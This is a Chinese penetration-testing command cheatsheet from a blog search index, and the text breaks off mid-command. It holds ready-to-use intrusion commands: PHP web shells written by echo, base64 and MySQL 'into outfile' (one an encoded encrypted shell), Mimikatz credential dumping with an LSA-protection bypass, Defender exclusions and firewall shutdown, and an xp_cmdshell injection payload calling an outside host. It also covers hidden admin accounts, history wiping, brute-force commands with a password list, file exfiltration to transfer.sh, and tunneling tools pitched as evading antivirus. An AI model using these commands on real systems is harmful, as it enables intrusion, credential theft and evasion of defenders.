<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>command+cheatsheet</title>
      <link href="/2024/09/29/command-cheatsheet/"/>
      <url>/2024/09/29/command-cheatsheet/</url>
      
        <content type="html"><![CDATA[<h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><p>收集渗透中会用到的常用命令  。</p><p>建议直接[Ctrl+F]查找    </p><h1 id="java命令执行"><a href="#java命令执行" class="headerlink" title="java命令执行"></a>java命令执行</h1><p>如下编码网站：<br><a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a><br><a href="https://r0yanx.com/tools/java_exec_encode/">https://r0yanx.com/tools/java_exec_encode/</a><br><a href="https://www.bugku.net/runtime-exec-payloads/">https://www.bugku.net/runtime-exec-payloads/</a>   </p><p>手动编码操作  </p><pre><code>bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p>Windows下</p><pre><code>getRuntime().exec(\&quot;cmd /c echo 1 &gt; D://tomcat//webapps//ROOT//90s.txt\&quot;);</code></pre><h2 id="命令执行，定位资源文件写文件回显"><a href="#命令执行，定位资源文件写文件回显" class="headerlink" title="命令执行，定位资源文件写文件回显"></a>命令执行，定位资源文件写文件回显</h2><p>Linux</p><pre><code>find /|grep index.js|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done</code></pre><p>Windows(注意盘符)</p><pre><code>for /r D:\ %i in (index.js*) do whoami &gt; %i/../test.txt</code></pre><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>在windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”<br>在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。<br>windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。  </p><p>方法1</p><pre><code>set /p=qaxnb&lt;nul&gt;d:\1d13.txt</code></pre><p>方法2</p><pre><code>echo qaxnb&gt;1we.txt</code></pre><p>追加内容</p><pre><code>echo qaxnb&gt;&gt;1we.txt</code></pre><p>不换行追加</p><pre><code>set /p=&quot;121d2&quot;&gt;&gt;a.txt</code></pre><p>规避空格</p><pre><code>echo.123&gt;&gt;a.txtecho,123&gt;&gt;a.txttype;a.txt</code></pre><p>写特殊字符很多的文件，可以用certutil编码再还原。<br>如下还原</p><pre><code>certutil -f -decode 111.txt C:\\111.jspcertutil -decodehex 111.txt C:\\111.jsp</code></pre><p>linux下base64</p><pre><code>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php</code></pre><p>php的</p><pre><code>echo \&lt;\?php eval\(\@\$_POST\[1\]\)\; \?\&gt; &gt;1.php</code></pre><p>绕过空格</p><pre><code>&gt; &lt; &lt;&gt; 重定向符%09(需要php环境)$&#123;IFS&#125;$IFS$9&#123;cat,flag.php&#125;%20%09</code></pre><h1 id="windows打包目录"><a href="#windows打包目录" class="headerlink" title="windows打包目录"></a>windows打包目录</h1><pre><code>powershell -Command &quot;Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip&quot;</code></pre><h1 id="匿名文件存储"><a href="#匿名文件存储" class="headerlink" title="匿名文件存储"></a>匿名文件存储</h1><p>可用命令行<br><a href="https://transfer.sh/">https://transfer.sh/</a><br>使用很简单   </p><pre><code>上传，成功后返回随机路径curl --upload-file ./hello.txt https://transfer.sh/hello.txt获取https://transfer.sh/fF6OA7aF8o/hello.txt</code></pre><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><pre><code>nbtscan.exe 10.11.1.0/24</code></pre><h2 id="dos命令存活主机探测"><a href="#dos命令存活主机探测" class="headerlink" title="dos命令存活主机探测"></a>dos命令存活主机探测</h2><pre><code>for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr &quot;TTL=&quot;</code></pre><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>只执行 ping 扫描。它不会进行任何端口扫描或服务&#x2F;版本检测</p><pre><code>nmap -sn 10.11.1.0/24</code></pre><p>SYN扫描，不ping</p><pre><code>sudo nmap -sS -Pn 192.168.10.1/24</code></pre><p>udp发包探测存活，比较慢</p><pre><code>sudo nmap -sU -Pn 10.11.1.0/24</code></pre><p>多种方式，进行存活探测(TCP ACK、TCP FIN 和 UDP 数据包来探测主机)</p><pre><code>sudo nmap -PA -Pn 192.168.10.1/24</code></pre><p>扫描版本，全端口</p><pre><code>nmap -sV -p- 10.11.1.0</code></pre><pre><code>nmap 10.11.1.0 --script vuln</code></pre><pre><code>nmap -p445 10.11.1.0 --script smb-vuln-ms17-010</code></pre><pre><code>nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk &#39;&#123;print $5&#125;&#39; | grep -v &quot;latency).&quot; &gt;ok_ip.txt</code></pre><p>nmap 极速扫描，快如闪电</p><pre><code>nmap -n --unique --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX &#123;filename&#125; --version-intensity 9 --min-rate 10000 -T4 192.168.23.1nmap -n --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX &#123;filename&#125; --version-intensity 9 --min-rate 10000 -T4 192.168.23.1</code></pre><p>获取http title</p><pre><code>nmap -n --resolve-all -Pn --min-hostgroup  --max-retries 3 --host-timeout 10m --script-timeout 3m --version-intensity 9 --min-rate 10000 --script=http-title -T4 -p- -iL domain.txt</code></pre><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>注意速率问题,根据带宽调整。100m带宽可调3000,注意是vps，不是家庭宽带。   </p><p>关于编译，直接git拉下来，make就行。生成的文件在bin下面。<br>扫描单ip   </p><pre><code>masscan 192.168.1.110 -p 1-65535 --rate=1000</code></pre><p>扫描列表</p><pre><code>masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt</code></pre><p>解析,提取ip:port</p><pre><code>cat port.txt |awk &#39;&#123;print $4&quot;:&quot;$3&#125;&#39;</code></pre><p>转换为nmap可用端口</p><pre><code>cat p.txt | tr &quot;\n&quot; ,</code></pre><h2 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h2><pre><code>22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,489921-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,5006020-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389</code></pre><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><details><summary>top200</summary><pre><code>123456password1234567891234567812345qwerty123123111111abc1231234567dragon1q2w3e4rsunshine654321master1234football1234567890000000computer666666supermanmichaelinternetiloveyoudaniel1qaz2wsxmonkeyshadowjessicaletmeinbaseballwhateverprincessabcd1234123321starwars121212thomaszxcvbnmtrustno1killerwelcomejordanaaaaaa123qwefreedompassword1charliebatmanjennifer7777777michellediamondolivermercedesbenjamin11111111snoopysamanthavictoriamatrixgeorgealexandersecretcookieasdfgh987654321123abcorangefuckyouasdf1234pepperhuntersilverjoshuabanana1q2w3echelsea1234qwersummerqwertyuiopphoenixandrewq1w2e3r4elephantrainbowmustangmerlinlondongarfieldrobertchocolate112233samsungqazwsxmatthewbusterjonathangingerflower555555testcarolineamandamaverickmidnightmartinjunior88888888anthonyjasminecreativepatrickmickey123qwerty123cocacolachickenpassw0rdforeverwilliamnicolehelloyellownirvanajustinfriendscheesetiggermotherliverpoolblink182asdfghjklandreaspiderscooterrichardsoccerrachelpurplemorganmelissajacksonarsenal222222qwe123gabrielferrarijasperdaniellebanditangelascorpionprincemaggieaustinveronicanicholasmonsterdextercarlosthundersuccesshannahashley131313stellabrandonpokemonjosephasdfasdf999999metallicadecemberchestertaylorsophiesamuelrabbitcrystalbarneyxxxxxxstevenrangerpatriciachristianassholespidermansandrahockeyangelssecurityparkerheather888888victorharley333333systemslipknotnovemberjordan23canadatennisqwertyuicasper</code></pre></details><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>一条命令</p><pre><code>.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</code></pre><p>控制台执行多条命令，用log防止进程崩溃，数据丢失</p><pre><code>mimikatz # privilege::debugmimikatz # logmimikatz # sekurlsa::logonpasswordsmimikatz # sekurlsa::wdigest</code></pre><p>msf中执行命令</p><pre><code>mimikatz_command -f sekurlsa::logonPasswords fullmimikatz_command -f sekurlsa::wdigest</code></pre><p>注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1</code></pre><h3 id="bypass-lsa-Protection-ppl"><a href="#bypass-lsa-Protection-ppl" class="headerlink" title="bypass lsa Protection(ppl)"></a>bypass lsa Protection(ppl)</h3><p>查询是否启用</p><pre><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code></pre><p>把mimidriver.sys拷贝到同级目录，进行加载bypass</p><pre><code>mimikatz # !+mimikatz # !processprotect /process:lsass.exe /removemimikatz # privilege::debug    mimikatz # token::elevatemimikatz # sekurlsa::logonpasswordsmimikatz # !processprotect /process:lsass.exemimikatz # !-</code></pre><h2 id="cs凭证解析"><a href="#cs凭证解析" class="headerlink" title="cs凭证解析"></a>cs凭证解析</h2><p>提取用户名</p><pre><code>awk -F&quot;:::&quot; &#39;&#123;print $1&#125;&#39; credentials.txt | awk -F&quot;\\&quot; &#39;&#123;print $2&#125;&#39;</code></pre><p>提取hash</p><pre><code>awk -F&quot;:::&quot; &#39;&#123;print $2&#125;&#39; credentials.txt</code></pre><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Defender排除项</p><pre><code>powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\test&quot;</code></pre><h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><pre><code>gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt</code></pre><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><pre><code>python3 dirsearch.py -e php,html,js -u https://target</code></pre><pre><code>python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</code></pre><pre><code>python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</code></pre><pre><code>python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</code></pre><pre><code>python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</code></pre><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><p>proxychain<br>sockscap64<br>proxifier<br>ccproxy<br>sockscap</p><p><a href="https://www.mediafire.com/folder/32rj1769a2w82/v4.7">https://www.mediafire.com/folder/32rj1769a2w82/v4.7</a>   </p><h2 id="内网穿透工具"><a href="#内网穿透工具" class="headerlink" title="内网穿透工具"></a>内网穿透工具</h2><h3 id="fuso"><a href="#fuso" class="headerlink" title="fuso"></a>fuso</h3><ul><li><p><a href="https://github.com/editso/fuso.git">https://github.com/editso/fuso.git</a>   </p></li><li><p>相对冷门，不会被杀<br>在9004上开启socks5代理  </p><pre><code>fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004</code></pre></li></ul><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><pre><code class="bash"> frps -c frps.ini# 客户端frpc -c frpc.ini</code></pre><pre><code>#服务端配置    [common]    bind_port=8080#靶机客户端    [common]    server_addr=服务器端外网IP    server_port=8080    [socks5]    type=tcp    remote_port=12345    plugin=socks5    use_encryption=true    use_compression=true</code></pre><h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>     </p><pre><code> sudo ./nps install sudo nps start</code></pre><p>安装后配置文件位置&#x2F;etc&#x2F;nps，默认密码(可在配置文件里面修改)admin&#x2F;123  </p><h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a href="https://github.com/lz520520/Stowaway">https://github.com/lz520520/Stowaway</a></p><h3 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h3><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>无记录shell</p><pre><code> ssh -T root@192.168.1.1 /usr/bin/bash -i</code></pre><h2 id="grep搜索"><a href="#grep搜索" class="headerlink" title="grep搜索"></a>grep搜索</h2><pre><code>grep -E &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; -r xxx --color=auto</code></pre><pre><code>grep -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto</code></pre><pre><code>grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/</code></pre><pre><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /app/ |sort|uniq &gt;&gt; test.txt</code></pre><p>web应用</p><pre><code>grep -EHirn &#39;--include=*.&#39;&#123;java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql&#125; &quot;accesskey|api_key|apikey|jdbc|username|pass|passwd|password&quot; webapps/</code></pre><p>搜索文件内的字符串</p><pre><code>grep -r &quot;test&quot; ./src显示行号grep -rn &quot;test&quot; ./src</code></pre><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>开远程</p><pre><code>use mysql;  update user set host = &#39;%&#39; where user = &#39;root&#39;;  FLUSH PRIVILEGES ;  select host, user from user; mysql -uroot -p -e &quot;select * from mysql.user;&quot; &gt;1.txt</code></pre><p>不登录直接执行sql</p><pre><code>mysql -uaHmin -proot test -e &quot;select now()&quot; -N &gt;H:/work/target1.txtmysql -uroot -e &quot;show databases;&quot; &gt;1.txt</code></pre><p>mysql getshell</p><pre><code>show variables like &#39;%secure%&#39;    select &#39;&lt;?php eval($_POST[xxx]) ?&gt;&#39; into outfile &#39;/var/www/xx.php&#39;;  select &#39;&lt;?php eval($_POST[xx]) ?&gt;&#39; into dumpfile &#39;/var/www/xx.php&#39;;  </code></pre><pre><code>set global general_log=on;  set global general_log_file=&#39;/var/www/1.php&#39;;  select &#39;&lt;?php eval($_POST[s6]) ?&gt;&#39;;</code></pre><pre><code>select &#39;&lt;?php file_put_contents(&quot;abab.php&quot;,base64_decode(&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;));?&gt;&#39; into outfile &#39;C:/wamp/www/abb.php&#39;;</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --proxy &quot;http://127.0.0.1:1080&quot;</code></pre><pre><code>python sqlmap.py  -u &quot;http://www.vuln.cn&quot; –cookie &quot;id=11&quot; --level 2</code></pre><pre><code>python sqlmap.py -u &quot;www.xxxx.com/product/detail/id/3*.html&quot; --dbms=mysql -v 3 </code></pre><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  --dbs</code></pre><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=*&quot;  --dbms mysql  --dbs</code></pre><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  -D test --tables</code></pre><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  -D test -T admin –-columns</code></pre><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql -D test -T admin -C &quot;username,password&quot; --dump</code></pre><pre><code>python sqlmap.py -r &quot;c:\request.txt&quot; -p id –dbms mysql –file-read=&quot;e:\www\as\config.php&quot;</code></pre><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>堆叠注入，xpcmdshell</p><pre><code>http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--</code></pre><h2 id="gitlab相关"><a href="#gitlab相关" class="headerlink" title="gitlab相关"></a>gitlab相关</h2><p>进入控制台</p><pre><code>gitlab-rails console production如果没配置环境变量，cd到安装目录下/bin/rails console production如果报错可用./rails console -e production</code></pre><p>修改密码</p><pre><code>通过用户名查找，赋值给useruser = User.where(username:&quot;root&quot;).first修改密码user.password = &quot;abc123&quot;user.password_confirmation= &quot;abc123&quot;user.save!</code></pre><p>把用户设为admin</p><pre><code>通过用户名查找，赋值给useruser = User.where(username:&quot;test&quot;).firstuser.admin=tureuser.save!</code></pre><p>新增用户参考：<a href="https://gist.github.com/tacettin/8182358">https://gist.github.com/tacettin/8182358</a></p><h2 id="找可写目录"><a href="#找可写目录" class="headerlink" title="找可写目录"></a>找可写目录</h2><pre><code>### linux#### 在/root  war文件的同目录下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$(dirname $file)/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $(dirname $file)/finddir.txt&quot;;done#### 在/root  war文件夹下写find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done删find /root -name war|while read file;do sh -c &quot;rm $file/finddir.txt&quot;;done### windows#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下写for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (echo %i &gt; %i\..\finddir.txt)删for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (del %i\..\finddir.txt)#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下写for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (echo %i &gt; %i\finddir.txt)删for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (del %i\finddir.txt)</code></pre><p>示例：在weblogic靶机&#x2F;root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。</p><pre><code>find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done</code></pre><p> 程序名找启动路径</p><pre><code>wmic process where name=&#39;mysqld.exe&#39; get processid,executablepath,name</code></pre><p>程序pid找路径</p><pre><code>wmic process get name,executablepath,processid|findstr pid</code></pre><p>启动路径找login.jsp</p><pre><code>for /f %i in (&#39;dir /s /b D:\UFGOV\U8\login.jsp&#39;) do (echo %i)</code></pre><p>base64分段不换行追加写文件</p><pre><code>echo|set /p=\&quot;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\&quot; &gt; D:\UFGOV\U8\webapps\demonstrate.txt</code></pre><p>解决cmd无回显问题</p><pre><code>powershell Get-ChildItem C:</code></pre><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><pre><code>参数：-l 指定的用户名 -L 用户名字典-p 指定密码 -P 密码字典-s 指定端口 -o 输出文件-t 任务数默认16-f 爆破成功一个就停止-v 报错日志详细 -V 攻击日志&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10</code></pre><h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><pre><code>参数：-h 目标名或IP  -H 目标列表-u 用户名 -U 用户名字典-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程-n 指定端口 -e ns 尝试空密码和用户名密码相同&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql</code></pre><h2 id="python交互shell"><a href="#python交互shell" class="headerlink" title="python交互shell"></a>python交互shell</h2><p>py3</p><pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>py2</p><pre><code>python2 -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>用完记得清记录</p><pre><code>history -c</code></pre><h2 id="无交互添加用户"><a href="#无交互添加用户" class="headerlink" title="无交互添加用户"></a>无交互添加用户</h2><pre><code>useradd newuser;echo &quot;newuser:password&quot;|chpasswd</code></pre><pre><code>useradd -p `openssl passwd 123456` guest</code></pre><pre><code>useradd -p &quot;$(openssl passwd 123456)&quot; guest</code></pre><pre><code>useradd newuwer;echo -e &quot;123456\n123456\n&quot; |passwd newuser</code></pre><h3 id="windows添加用户"><a href="#windows添加用户" class="headerlink" title="windows添加用户"></a>windows添加用户</h3><pre><code>net user admin$ Afabab@20 /addnet localgroup administrators admin$ /addnet user guest /active:yesnet localgroup administrators guest /addNet localgroup Administrators kent /add /domain 将域用户添加到域管理员组Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组</code></pre><h2 id="Windows防火墙"><a href="#Windows防火墙" class="headerlink" title="Windows防火墙"></a>Windows防火墙</h2><pre><code>通过服务关闭sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;sc \\192.168.93.10 start unablefirewall关闭防火墙netsh firewall set opmode mode=disable放行远程8888端口进来的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=in remoteport=8888 action=allow放行出去到远程8888端口的流量netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=out remoteport=8888 action=allow放行本地4444端口出去的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=out localport=4444 action=allow放行从本地4444端口进来的流量netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=in localport=4444 action=allow删除规则netsh advfirewall firewall delete rule name=&quot;88&quot;查看防火墙配置(可看到具体规则等配置)netsh firewall show config关闭windefebdnet stop windefendnetsh firewall set portopening TCP 445 ENABLE //打开445端口    netsh firewall set portopening TCP 3389 ENABLE //开放终端  netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe   netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   新版本命令   netsh advfirewall firewall add 